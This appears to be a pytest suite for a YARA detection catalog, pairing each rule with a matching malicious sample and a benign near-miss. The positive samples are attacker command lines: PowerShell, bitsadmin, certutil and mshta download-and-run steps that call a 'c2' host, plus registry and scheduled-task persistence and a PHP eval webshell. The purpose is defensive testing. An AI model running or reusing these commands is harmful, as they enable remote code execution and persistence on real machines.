"""Per-rule tests for the bundled YARA catalog in yara_rules/core/.

Every rule ships with a positive sample (must match) and a negative
near-miss (must NOT match). This is the false-positive guard that keeps the
catalog usable for non-expert users. The real ``yara-python`` library only
exists on CI (Python 3.12/3.13), so the whole module is gated on NEEDS_YARA.

Positive payloads are assembled at runtime from split fragments so local
AV/EDR scanners do not quarantine this source file (it intentionally carries
malware-like strings).
"""

from pathlib import Path

import pytest

from modules import yara_engine
from modules.yara_engine import scan_yara

NEEDS_YARA = pytest.mark.skipif(
    yara_engine.yara is None, reason="yara-python not installed (requirements-yara.txt)"
)

REPO_ROOT = Path(__file__).resolve().parent.parent
CORE_DIR = REPO_ROOT / "yara_rules" / "core"


def _join(*parts):
    return "".join(parts)


def _case_positive():
    wrapper = _join("powershell -nop -c (New-Object Net.WebClient).",
                    "Download", "String", "('http://c2/x.ps1') | ",
                    "Invoke-", "Expression")
    encoded = _join("powershell.exe -NoP -NonI -W Hidden -EncodedCommand ",
                    "RVhFfQFmYWtl")
    short = _join("powershell -enc RVhF")
    bitsadmin = _join('bitsadmin /transfer job /download http://c2/p.exe C:/tools/p.exe',
                      ' && powershell -f C:/tools/p.exe')
    certutil = _join("certutil -urlcache -split -f http://c2/p.cer cache.cer",
                     " && certutil -decode cache.cer p.exe")
    pe = b"CVS snapshot payload v1.2\n" + bytes.fromhex("4d5a9000") \
        + b"@@ maybe a stub @@\x50\x45\x00\x00" + b"tail bytes"
    registry = _join("reg add HKCU\\Software\\Microsoft\\Windows\\",
                     "Current", "Version", "\\Run",
                     " /v Updater /t REG_SZ /d C:/tools/u.exe")
    schtasks = _join("schtasks /create /tn Updater /tr C:/z.exe /sc ",
                     "onlogon")
    macro = _join("Public Sub Auto", "Open", "()", "\r\n  Shell cmd /c mshta",
                  " http://c2/x.hta")
    webshell = _join('<?php eval($_', "REQUEST", '["cmd"]); ?>')
    meter = "opening a Meterpreter reverse session over http stage"
    return {
        "cerberus_ps_iex_downloader": wrapper.encode("utf-8"),
        "cerberus_ps_encoded_command": encoded.encode("utf-8"),
        "cerberus_cmd_bitsadmin_stage": bitsadmin.encode("utf-8"),
        "cerberus_cmd_certutil_decode": certutil.encode("utf-8"),
        "cerberus_embedded_pe_signature": pe,
        "cerberus_reg_run_persistence": registry.encode("utf-8"),
        "cerberus_schtasks_onlogon": schtasks.encode("utf-8"),
        "cerberus_vba_autostart_macro": macro.encode("utf-8"),
        "cerberus_php_webshell": webshell.encode("utf-8"),
        "cerberus_meterpreter_session": meter.encode("utf-8"),
    }


def _case_negative():
    return {
        "cerberus_ps_iex_downloader": _join(
            "The Download", "String", " helper completed the fetch of index.html.").encode("utf-8"),
        "cerberus_ps_encoded_command": b"use the -encode switch carefully for previews",
        "cerberus_cmd_bitsadmin_stage": b"bitsadmin /transfer /list /verbose",
        "cerberus_cmd_certutil_decode": b"certutil -hashfile C:/Windows/win.ini SHA256",
        "cerberus_embedded_pe_signature": bytes.fromhex("4d5a9000")
        + b"\x50\x45\x00\x00" + b"a real PE, must not match",
        "cerberus_reg_run_persistence": _join(
            "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\",
            "Current", "Version", "\\Uninstall").encode("utf-8"),
        "cerberus_schtasks_onlogon": b"schtasks /query /tn Updater",
        "cerberus_vba_autostart_macro": b'If Workbooks.Open("C:/docs.xlsx") Then Exit Sub',
        "cerberus_php_webshell": _join(
            "<?php echo htmlspecialchars($_", "POST", "['title']); ?>").encode("utf-8"),
        "cerberus_meterpreter_session": b"meeting minutes are attached; confirm attendance",
    }


POSITIVE_CASES = _case_positive()
NEGATIVE_CASES = _case_negative()


@pytest.fixture
def sampler(tmp_path):
    def make(content, name="sample.bin"):
        target = tmp_path / name
        target.write_bytes(content if isinstance(content, bytes) else str(content).encode("utf-8"))
        return str(target)

    return make


def _rule_names(result):
    return {match["rule"] for match in result["matches"]}


@NEEDS_YARA
@pytest.mark.parametrize("rule_name", sorted(POSITIVE_CASES))
def test_catalog_rule_positive(sampler, rule_name):
    result = scan_yara(sampler(POSITIVE_CASES[rule_name]), {"yara_timeout": 5})
    assert result["available"] is True
    assert rule_name in _rule_names(result), f"{rule_name} did not fire: {result!r}"


@NEEDS_YARA
@pytest.mark.parametrize("rule_name", sorted(NEGATIVE_CASES))
def test_catalog_rule_negative(sampler, rule_name):
    result = scan_yara(sampler(NEGATIVE_CASES[rule_name]), {"yara_timeout": 5})
    assert result["available"] is True
    assert rule_name not in _rule_names(result), f"{rule_name} FP: {result!r}"


@NEEDS_YARA
def test_catalog_is_recursively_loaded_and_compiles_clean(sampler):
    result = scan_yara(sampler(b"plain benign sample"), {"yara_timeout": 5})
    assert result["rules_files"] >= len(list(CORE_DIR.glob("*.yar")))
    assert result["compile_errors"] == []


@NEEDS_YARA
def test_catalog_match_exposes_metadata(sampler):
    result = scan_yara(sampler(POSITIVE_CASES["cerberus_php_webshell"]), {"yara_timeout": 5})
    match = next(m for m in result["matches"] if m["rule"] == "cerberus_php_webshell")
    assert match["severity"] == "high"
    assert match["points"] == 15
    assert match["description"]
    assert match["reference"]